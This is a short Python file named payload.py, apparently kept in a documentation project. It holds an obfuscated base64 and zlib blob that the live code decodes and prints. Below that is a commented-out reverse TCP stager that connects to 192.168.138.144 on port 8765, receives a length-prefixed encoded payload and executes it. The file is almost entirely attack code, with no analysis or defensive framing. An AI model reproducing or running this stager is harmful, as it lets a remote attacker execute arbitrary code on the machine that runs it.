#  coding: utf-8
#
#  Copyright (C) 2022-2023, Inc. All Rights Reserved
#
#  @Time    : 2023-01-02
#  @Author  : yan que
#  @Email   : yanquer@qq.com
#  @File    : payload.py
#  @Project : rst-document

print(
	__import__('zlib').
	decompress(
		__import__('base64').
		b64decode(
			__import__('codecs').
			getencoder('utf-8')
			('eNo9UE1LxDAQPTe/ordMMIbtmq3rYgURDyIiuN6WRdp01NI0DUlWq+J/tyGLh5nhzbx589ENdnQh96PqMfBv3TW8qT2WkvvgDirw0A1IXkeXT3lnclebN4RiwTYkC+5r9pmvUrNIAZb8iLePN/cv2+en2+sHFnlCjcagCgC0uFiKolyL4mw2KSlfn5crFlmNw7onGU4KbYjycb7wGtHCihFdpbXEwdha9UCv7ij3wqH6AMnYbrEnbXXEmpHP905jrtFAyy71LNee/FdPU5oRnFBBvFy0qMbBOvQe0hNEU8qYbDEy+Q/1dON/GfkDw/ZfqA==')
			[0]
		)
	).decode('utf-8')
)

# import socket, zlib, base64, struct, time
#
# for x in range(10):
# 	try:
# 		s = socket.socket(2, socket.SOCK_STREAM)
# 		s.connect(('192.168.138.144', 8765))
# 		break
# 	except:
# 		time.sleep(5)
# l = struct.unpack('>I', s.recv(4))[0]
# d = s.recv(l)
# while len(d) < l:
# 	d += s.recv(l - len(d))
# exec(zlib.decompress(base64.b64decode(d)), {'s': s})
